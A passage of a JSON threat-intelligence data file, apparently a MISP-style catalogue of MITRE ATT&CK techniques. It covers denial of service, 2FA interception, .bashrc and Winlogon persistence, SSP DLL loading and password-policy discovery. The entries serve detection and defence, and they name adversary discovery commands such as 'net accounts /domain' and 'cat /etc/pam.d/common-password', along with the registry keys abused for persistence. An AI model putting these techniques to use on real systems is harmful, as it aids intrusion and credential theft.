          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "SSL/TLS inspection",
          "Web logs",
          "Web application firewall logs",
          "Network intrusion detection system",
          "Network protocol analysis",
          "Network device logs",
          "Netflow/Enclave netflow"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1499",
          "https://capec.mitre.org/data/definitions/227.html",
          "https://capec.mitre.org/data/definitions/131.html",
          "https://capec.mitre.org/data/definitions/130.html",
          "https://capec.mitre.org/data/definitions/125.html",
          "https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html",
          "https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf",
          "https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf",
          "https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged",
          "https://arstechnica.com/information-technology/2015/03/massive-denial-of-service-attack-on-github-tied-to-chinese-government/",
          "https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf",
          "https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/",
          "https://www.corero.com/resources/ddos-attack-types/syn-flood-ack.html",
          "https://www.cloudflare.com/learning/ddos/http-flood-ddos-attack/",
          "https://www.netscout.com/blog/asert/ddos-attacks-ssl-something-old-something-new",
          "https://blog.sucuri.net/2015/08/bind9-denial-of-service-exploit-in-the-wild.html",
          "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf"
        ]
      },
      "uuid": "c675646d-e204-4aa8-978d-e3d6d65885c4",
      "value": "Endpoint Denial of Service - T1499"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nA technique to push an [iOS](https://www.apple.com/ios) or [Android](https://www.android.com) MMS-type message to the target which does not require interaction on the part of the target to be successful. (Citation: BlackHat Stagefright) (Citation: WikiStagefright)",
      "meta": {
        "external_id": "T1373",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1373"
        ]
      },
      "uuid": "702dc95d-3266-42dc-9eef-4a19e2445148",
      "value": "Push-notification client-side exploit - T1373"
    },
    {
      "description": "The use of software, data, or commands to take advantage of a weakness in an Internet-facing computer system or program in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211).\n\nIf an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
      "meta": {
        "external_id": "T1190",
        "kill_chain": [
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "AWS CloudTrail logs",
          "Stackdriver logs",
          "Packet capture",
          "Web logs",
          "Web application firewall logs",
          "Application logs"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS",
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1190",
          "https://nvd.nist.gov/vuln/detail/CVE-2016-6662",
          "https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/",
          "https://nvd.nist.gov/vuln/detail/CVE-2014-7169",
          "https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project",
          "https://cwe.mitre.org/top25/index.html"
        ]
      },
      "uuid": "3f886f2a-874f-4333-b794-aa6075009b1c",
      "value": "Exploit Public-Facing Application - T1190"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nA technique that takes advantage of flaws in client-side applications without targeting specific users. For example, an exploit placed on an often widely used public web site intended for drive-by delivery to whomever visits the site. (Citation: CitizenLabGreatCannon)",
      "meta": {
        "external_id": "T1370",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1370"
        ]
      },
      "uuid": "2ec57bf1-fcc3-4c19-9516-79b7fde483af",
      "value": "Untargeted client-side exploitation - T1370"
    },
    {
      "description": "Use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. Adversaries may target authentication mechanisms, such as smart cards, to gain access to systems, services, and network resources.\n\nIf a smart card is used for two-factor authentication (2FA), then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)",
      "meta": {
        "external_id": "T1111",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Process monitoring",
          "Kernel drivers"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1111",
          "https://dl.mandiant.com/EE/assets/PDF_MTrends_2011.pdf",
          "https://gcn.com/articles/2011/06/07/rsa-confirms-tokens-used-to-hack-lockheed.aspx",
          "http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf"
        ]
      },
      "uuid": "dd43c543-bb85-4a6f-aa6e-160d90d06a49",
      "value": "Two-Factor Authentication Interception - T1111"
    },
    {
      "description": "Host based hiding techniques are designed to allow an adversary to remain undetected on a machine upon which they have taken action. They may do this through the use of  static linking of binaries, polymorphic code, exploiting weakness in file formats, parsers, or self-deleting code. (Citation: VirutAP)",
      "meta": {
        "external_id": "T1314",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1314"
        ]
      },
      "uuid": "6f088e84-37b2-44de-8df3-393908f2d77b",
      "value": "Host-based hiding techniques - T1314"
    },
    {
      "description": "Technical network hiding techniques are methods of modifying traffic to evade network signature detection or to utilize misattribution techniques. Examples include channel/IP/VLAN hopping, mimicking legitimate operations, or seeding with misinformation. (Citation: HAMMERTOSS2015)",
      "meta": {
        "external_id": "T1315",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1315"
        ]
      },
      "uuid": "90884cdb-31dd-431c-87db-9cc7e03191e5",
      "value": "Network-based hiding techniques - T1315"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nA technique used to compromise a specific group of end users by taking advantage of flaws in client-side applications. For example, infecting websites that members of a targeted group are known to visit with the goal to infect a targeted user's computer. (Citation: RSASEThreat) (Citation: WikiStagefright) (Citation: ForbesSecurityWeek) (Citation: StrongPity-waterhole)",
      "meta": {
        "external_id": "T1371",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1371"
        ]
      },
      "uuid": "72923cae-6c8c-4da2-8f48-b73389529c25",
      "value": "Targeted client-side exploitation - T1371"
    },
    {
      "description": "Third-party libraries incorporated into mobile apps could contain malicious behavior, privacy-invasive behavior, or exploitable vulnerabilities. An adversary could deliberately insert malicious behavior or could exploit inadvertent vulnerabilities.\n\nFor example, Ryan Welton of NowSecure identified exploitable remote code execution vulnerabilities in a third-party advertisement library (Citation: NowSecure-RemoteCode). Grace et al. identified security issues in mobile advertisement libraries (Citation: Grace-Advertisement).\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1425",
        "refs": [
          "https://attack.mitre.org/techniques/T1425"
        ]
      },
      "related": [
        {
          "dest-uuid": "0d95940f-9583-4e0f-824c-a42c1be47fad",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "11bd699b-f2c2-4e48-bf46-fb3f8acd9799",
      "value": "Insecure Third-Party Libraries - T1425"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nThe use of software, data, or commands to take advantage of a weakness in a computer system or program in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. (Citation: GoogleCrawlerSQLInj)",
      "meta": {
        "external_id": "T1377",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1377"
        ]
      },
      "uuid": "8a64f743-acaa-49d5-9d3d-ae5616a3876f",
      "value": "Exploit public-facing application - T1377"
    },
    {
      "description": "<code>~/.bash_profile</code> and <code>~/.bashrc</code> are shell scripts that contain shell commands. These files are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. <code>~/.bash_profile</code> is executed for login shells and <code>~/.bashrc</code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the <code>~/.bash_profile</code> script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the <code>~/.bashrc</code> script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment. \n\nThe macOS Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <code>~/.bash_profile</code> each time instead of <code>~/.bashrc</code>.\n\nAdversaries may abuse these shell scripts by inserting arbitrary shell commands that may be used to execute other binaries to gain persistence. Every time the user logs in or opens a new shell, the modified ~/.bash_profile and/or ~/.bashrc scripts will be executed.(Citation: amnesia malware).",
      "meta": {
        "external_id": "T1156",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters",
          "Process use of network"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1156",
          "https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/"
        ]
      },
      "uuid": "01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
      "value": ".bash_profile and .bashrc - T1156"
    },
    {
      "description": "Understanding an organizations business processes and tempo may allow an adversary to more effectively craft social engineering attempts or to better hide technical actions, such as those that generate network traffic. (Citation: Scasny2015) (Citation: Infosec-osint)",
      "meta": {
        "external_id": "T1280",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1280"
        ]
      },
      "uuid": "1f82ef59-b7da-4cd3-a41c-2e80f80f084f",
      "value": "Identify business processes/tempo - T1280"
    },
    {
      "description": "### Windows\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Mac\n\nOn Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.\n\n### Linux\n\nOn Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.",
      "meta": {
        "external_id": "CAPEC-577",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1033",
          "https://capec.mitre.org/data/definitions/577.html"
        ]
      },
      "uuid": "03d7999c-1f4c-42cc-8373-e7690d318104",
      "value": "System Owner/User Discovery - T1033"
    },
    {
      "description": "An adversary could use knowledge of the techniques used by security software to evade detection(Citation: Brodie)(Citation: Tan). For example, some mobile security products perform compromised device detection by searching for particular artifacts such as an installed \"su\" binary, but that check could be evaded by naming the binary something else. Similarly, polymorphic code techniques could be used to evade signature-based detection(Citation: Rastogi).",
      "meta": {
        "external_id": "EMM-5",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1408",
          "https://pages.nist.gov/mobile-threat-catalogue/emm-threats/EMM-5.html",
          "https://media.blackhat.com/eu-13/briefings/Brodie/bh-eu-13-lacoon-attacks-mdm-brodie-wp.pdf",
          "http://www.blackhat.com/us-16/briefings.html#bad-for-enterprise-attacking-byod-enterprise-mobile-security-solutions",
          "http://pages.cs.wisc.edu/~vrastogi/static/papers/rcj13b.pdf"
        ]
      },
      "uuid": "b332a960-3c04-495a-827f-f17a5daed3a6",
      "value": "Disguise Root/Jailbreak Indicators - T1408"
    },
    {
      "description": "Templates and branding materials may be used by an adversary to add authenticity to social engineering message. (Citation: Scasny2015)",
      "meta": {
        "external_id": "T1281",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1281"
        ]
      },
      "uuid": "68b45999-bb0c-4829-bbd0-75d6dac57c94",
      "value": "Obtain templates/branding materials - T1281"
    },
    {
      "description": "Common Vulnerability Enumeration (CVE) is a dictionary of publicly known information about security vulnerabilities and exposures. An adversary can use this information to target specific software that may be vulnerable. (Citation: WeaponsVulnerable) (Citation: KasperskyCarbanak)",
      "meta": {
        "external_id": "T1291",
        "kill_chain": [
          "mitre-pre-attack:technical-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1291"
        ]
      },
      "uuid": "abd5bed1-4c12-45de-a623-ab8dc4ff862a",
      "value": "Research relevant vulnerabilities/CVEs - T1291"
    },
    {
      "description": "Leadership conducts a cost/benefit analysis that generates a compelling need for information gathering which triggers a Key Intelligence Toptic (KIT) or Key Intelligence Question (KIQ). For example, an adversary compares the cost of cyber intrusions with the expected benefits from increased intelligence collection on cyber adversaries. (Citation: LowenthalCh4) (Citation: KIT-Herring)",
      "meta": {
        "external_id": "T1226",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1226"
        ]
      },
      "uuid": "51bca707-a806-49bf-91e0-03885b0ac85c",
      "value": "Conduct cost/benefit analysis - T1226"
    },
    {
      "description": "Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) may be further subdivided to focus on political, economic, diplomatic, military, financial, or intellectual property categories.  An adversary may specify KITs or KIQs in this manner in order to understand how the information they are pursuing can have multiple uses and to consider all aspects of the types of information they need to target for a particular purpose. (Citation: CompetitiveIntelligence) (Citation: CompetitiveIntelligence)KIT.",
      "meta": {
        "external_id": "T1229",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1229"
        ]
      },
      "uuid": "ae85ba2f-27ea-42d9-b42a-0fe89ee19ed5",
      "value": "Assess KITs/KIQs benefits - T1229"
    },
    {
      "description": "The approach or attack vector outlines the specifics behind how the adversary would like to attack the target.  As additional information is known through the other phases of PRE-ATT&CK, an adversary may update the approach or attack vector. (Citation: CyberAdversaryBehavior) (Citation: WITCHCOVEN2015) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)",
      "meta": {
        "external_id": "T1245",
        "kill_chain": [
          "mitre-pre-attack:target-selection"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1245"
        ]
      },
      "uuid": "d45fe3c2-0688-43b9-ac07-7eb86f575e93",
      "value": "Determine approach/attack vector - T1245"
    },
    {
      "description": "Technical blogs and forums provide a way for technical staff to ask for assistance or troubleshoot problems. In doing so they may reveal information such as operating system (OS), network devices, or applications in use. (Citation: FunAndSun2012)",
      "meta": {
        "external_id": "T1257",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1257"
        ]
      },
      "uuid": "a54a7708-8f64-45f3-ad51-1abf976986a0",
      "value": "Mine technical blogs/forums - T1257"
    },
    {
      "description": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\n\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\n\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. For example, AWS GuardDuty is not supported in every region.(Citation: AWS Region Service Table)\n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)",
      "meta": {
        "external_id": "T1535",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Stackdriver logs",
          "Azure activity logs",
          "AWS CloudTrail logs"
        ],
        "mitre_platforms": [
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1535",
          "https://aws.amazon.com/about-aws/global-infrastructure/regional-product-services/",
          "https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc"
        ]
      },
      "uuid": "59bd0dec-f8b2-4b9a-9141-37a1e6899761",
      "value": "Unused/Unsupported Cloud Regions - T1535"
    },
    {
      "description": "Configure and setup booter/stressor services, often intended for server stress testing, to enable denial of service attacks. (Citation: Krebs-Anna) (Citation: Krebs-Booter) (Citation: Krebs-Bazaar)",
      "meta": {
        "external_id": "T1396",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1396"
        ]
      },
      "uuid": "3d1488a6-59e6-455a-8b80-78b53edc33fe",
      "value": "Obtain booter/stressor subscription - T1396"
    },
    {
      "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.\n\nIn Mac, this can be done natively with a small [AppleScript](https://attack.mitre.org/techniques/T1155) script.",
      "meta": {
        "external_id": "T1010",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1010"
        ]
      },
      "uuid": "4ae4f953-fe58-4cc8-a327-33257e30a830",
      "value": "Application Window Discovery - T1010"
    },
    {
      "description": "Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.",
      "meta": {
        "external_id": "CAPEC-579",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1004",
          "https://capec.mitre.org/data/definitions/579.html",
          "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902"
        ]
      },
      "uuid": "514ede4c-78b3-4d78-a38b-daddf6217a79",
      "value": "Winlogon Helper DLL - T1004"
    },
    {
      "description": "If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device system partition, where it may persist after device resets and may not be easily removed by the device user.\n\nMany Android devices provide the ability to unlock the bootloader for development purposes. An unlocked bootloader may provide the ability for an adversary to modify the system partition. Even if the bootloader is locked, it may be possible for an adversary to escalate privileges and then modify the system partition.",
      "meta": {
        "external_id": "APP-27",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion",
          "mitre-mobile-attack:persistence",
          "mitre-mobile-attack:impact"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1400",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-27.html",
          "https://source.android.com/security/verifiedboot/",
          "https://www.apple.com/business/docs/iOS_Security_Guide.pdf"
        ]
      },
      "uuid": "c5089859-b21f-40a3-8be4-63e381b8b1c0",
      "value": "Modify System Partition - T1400"
    },
    {
      "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)\n",
      "meta": {
        "external_id": "T1500",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Process command-line parameters",
          "Process monitoring",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1500",
          "https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/"
        ]
      },
      "uuid": "cf7b3a06-8b42-4c33-bbe9-012120027925",
      "value": "Compile After Delivery - T1500"
    },
    {
      "description": "Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using [Tasklist](https://attack.mitre.org/software/S0057), and \"net start\" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well. Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "meta": {
        "external_id": "CAPEC-574",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1007",
          "https://capec.mitre.org/data/definitions/574.html"
        ]
      },
      "uuid": "322bad5a-1c49-4d23-ab79-76d641794afa",
      "value": "System Service Discovery - T1007"
    },
    {
      "description": "Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1023) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1158). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
      "meta": {
        "external_id": "CAPEC-562",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1080",
          "https://capec.mitre.org/data/definitions/562.html",
          "https://rewtin.blogspot.ch/2017/11/abusing-user-shares-for-efficient.html"
        ]
      },
      "uuid": "246fd3c7-f5e3-466d-8787-4c13d9e3b61c",
      "value": "Taint Shared Content - T1080"
    },
    {
      "description": "Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n (Citation: Graeber 2014)",
      "meta": {
        "external_id": "T1101",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "DLL monitoring",
          "Windows Registry",
          "Loaded DLLs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1101",
          "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
          "https://technet.microsoft.com/en-us/library/dn408187.aspx"
        ]
      },
      "uuid": "6c174520-beea-43d9-aac6-28fb77f3e446",
      "value": "Security Support Provider - T1101"
    },
    {
      "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
      "meta": {
        "external_id": "CAPEC-646",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "PowerShell logs",
          "API monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1120",
          "https://capec.mitre.org/data/definitions/646.html"
        ]
      },
      "uuid": "348f1eef-964b-4eb6-bb53-69b3dcb0c643",
      "value": "Peripheral Device Discovery - T1120"
    },
    {
      "description": "Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). An adversary may attempt to access detailed information about the password policy used within an enterprise network. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems. (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)\n\n### Windows\n* <code>net accounts</code>\n* <code>net accounts /domain</code>\n\n### Linux\n* <code>chage -l <username></code>\n* <code>cat /etc/pam.d/common-password</code>\n\n### macOS\n* <code>pwpolicy getaccountpolicies</code>",
      "meta": {
        "external_id": "T1201",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows",
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1201",
          "https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu",
          "https://www.jamf.com/jamf-nation/discussions/18574/user-password-policies-on-non-ad-machines"
        ]
      },
      "uuid": "b6075259-dba3-44e9-87c7-e954f37ec0d5",
      "value": "Password Policy Discovery - T1201"
    },
    {
      "description": "Business processes, such as who typically communicates with who, or what the supply chain is for a particular part, provide opportunities for social engineering or other  (Citation: Warwick2015)",
      "meta": {
        "external_id": "T1301",
        "kill_chain": [
          "mitre-pre-attack:organizational-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1301"
        ]
      },
      "uuid": "57619ab3-f6a5-43c8-8dd1-b0b8a986a870",
      "value": "Analyze business processes - T1301"
    },
    {
